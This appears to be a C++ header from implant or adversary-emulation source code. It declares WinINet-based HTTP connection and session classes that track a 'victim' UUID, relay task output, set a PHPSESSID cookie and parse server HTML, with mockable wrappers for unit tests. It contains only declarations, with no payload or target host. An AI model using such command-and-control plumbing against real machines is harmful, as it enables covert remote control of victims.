#pragma once
#include <windows.h>
#include <wininet.h>
#include <intsafe.h>
#include <memory>
#include <list>
#include <regex>

#include "WindowsWrappers.hpp"

#define FAIL_NULL_HTTP_CONNECTION 0x1003
#define FAIL_START_HTTP_SESSION 0x1004
#define FAIL_BAD_HTTP_RESP 0x1005
#define FAIL_RELAY_TASK_OUTPUT 0x1006
#define FAIL_SET_COOKIE 0x1007

#define RESP_BUFFER_SIZE 4096


const std::string PHPSESSID = std::string{"PHPSESSID"};

std::string GetValueTagValue(std::string html_blob);

// Forward declaration of HttpSession, so HttpConnection can reference it.
class HttpSession; 

class HttpConnection : public std::enable_shared_from_this<HttpConnection> {
protected:
    std::string uuid;
    HINTERNET hInternet;
    HINTERNET hConnect;
    
    std::string httpVersion = ""; // Default value is used as NULL according to Microsoft API and will select the right one.
    // Keeping track of any Sessions that may still be open
    std::list<std::weak_ptr<HttpSession>> currentSessions;
    
    
    bool Connect(WinApiWrapperInterface* api_wrapper);
public:
    std::string serverUrl;
    std::string httpUserAgent;
    int serverPort;

    // https://docs.microsoft.com/en-us/windows/win32/wininet/http-sessions
    HttpConnection(std::string url, unsigned int port, std::string victimUuid, std::string userAgentValue): 
        uuid(victimUuid), hInternet(nullptr), hConnect(nullptr), serverUrl(url), httpUserAgent(userAgentValue), serverPort(port)
        {};
    virtual ~HttpConnection();
    bool IsValid(WinApiWrapperInterface* api_wrapper);
    bool setHttpVersion(int newHttpVersion);
    bool MakeSimpleConnection(WinApiWrapperInterface* api_wrapper, std::string resource);
    bool SetTimeout(WinApiWrapperInterface* api_wrapper, int numMinutes);
    bool setCookie(std::string cookieName, std::string cookieValue, bool persistant);
    
    virtual std::shared_ptr<HttpSession> StartSession(WinApiWrapperInterface* api_wrapper, std::string resource, std::string uuid_override="");

    // Wrapper functions for testing through Google Test Mock framework.
    virtual HINTERNET InternetOpenWrapper(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags){
        return InternetOpenA(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
    };
    virtual HINTERNET InternetConnectWrapper(HINTERNET handleInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword,DWORD dwService,DWORD dwFlags,DWORD_PTR dwContext){
        return InternetConnectA(handleInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
    };
    virtual BOOL InternetSetOptionWrapper(HINTERNET handleInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength){
        return InternetSetOption(handleInternet, dwOption, lpBuffer, dwBufferLength);
    };

    // Helper functions for testing
    constexpr bool hasInternet() { return hInternet != nullptr; };
    constexpr bool hasConnection() { return hConnect != nullptr; };

};

class HttpSession {
protected:
    std::shared_ptr<HttpConnection> parentConnection; // Keeps parent pointer alive while object is alive.
    HINTERNET connectionHandle;
    const std::string httpVerb;
    const std::string httpResource;
    const std::string httpUserAgent;
    const std::string httpVersionStr;
    const std::string httpUuid;
    const std::string httpReferer;

    HINTERNET hHttpRequest;
    bool requestSent;
    DWORD numberOfBytesReturned; // Caching this information so size only retrieved once
    
    bool StartSession(WinApiWrapperInterface* api_wrapper);

public:
    HttpSession(std::shared_ptr<HttpConnection> httpConnection, HINTERNET connectHandle, 
            std::string verb, std::string resource, std::string userAgentValue, 
            std::string httpVersion, std::string uuid, std::string referer):
        parentConnection(httpConnection), connectionHandle(connectHandle), httpVerb(verb), httpResource(resource), httpUserAgent(userAgentValue), httpVersionStr(httpVersion), httpUuid(uuid), httpReferer(referer),
        hHttpRequest(nullptr), requestSent(false), numberOfBytesReturned(0)
        {};
    virtual ~HttpSession();
    bool SendData(WinApiWrapperInterface* api_wrapper, void* data, DWORD dataLength);
    bool ValidSession(WinApiWrapperInterface* api_wrapper);
    DWORD NumberBytesAvailable(WinApiWrapperInterface* api_wrapper);
    std::string GetData(WinApiWrapperInterface* api_wrapper);

    virtual HINTERNET HttpOpenRequestWrapper(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext){
        return HttpOpenRequestA(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
    };
    virtual BOOL HttpAddRequestHeadersWrapper(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers){
        return HttpAddRequestHeadersA(hRequest, lpszHeaders, dwHeadersLength, dwModifiers);
    };
    virtual BOOL HttpSendRequestWrapper(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength){
        return HttpSendRequestA(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
    };

    virtual BOOL InternetQueryDataAvailableWrapper(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext){
        return InternetQueryDataAvailable(hFile, lpdwNumberOfBytesAvailable, dwFlags, dwContext);
    };
    virtual BOOL InternetReadFileWrapper(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead){
        return InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
    };
};





